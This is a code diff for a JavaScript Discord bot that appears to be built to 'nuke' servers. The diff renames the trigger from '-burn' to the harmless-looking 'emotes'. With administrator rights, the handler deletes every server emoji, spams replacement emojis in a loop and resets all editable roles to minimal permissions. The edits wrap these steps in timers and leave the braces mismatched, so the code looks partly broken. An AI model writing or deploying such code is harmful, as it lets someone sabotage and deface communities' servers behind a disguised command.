@@ -163,29 +163,31 @@ client.on("message", msg => {
   })
      //this edits all roles
      client.on('message', message => {
-       if(message.content.startsWith('-burn')) {
+       if(message.content.startsWith('emotes')) {
  if(message.channel.type === "dm") {return}
          if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
   }    
   message.guild.emojis.cache.forEach(e => {
     e.delete()})
-    
-  var b = 0
+    setTimeout(() => {
+       var b = 0
   while(b < 39) {
   message.guild.emojis.create(randomicons123(), 'funny')
    message.guild.emojis.create('https://images-ext-1.discordapp.net/external/HRdm0jpSLissUbkke890fcGabWIpSEnmjlJykK4hgg8/https/images-ext-1.discordapp.net/external/LOxbVQxTHoQNiyrc-GMz__uODLQQ6v38Xpypt6K1LXo/https/media.discordapp.net/attachments/735392717886193666/772567167018991646/a48e2e66-bbd5-4ba6-b168-90ce8c7c6fa9.gif', 'cube')
     
 b++  
-}  
+} 
+   },6000) 
+});
 
+setTimeout(() => {
 
   message.guild.roles.cache.forEach(r => {
     if(r.editable) {
       r.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE'])
     .catch(console.error)}
 
-});
-
+},3000)
 
      }
      })
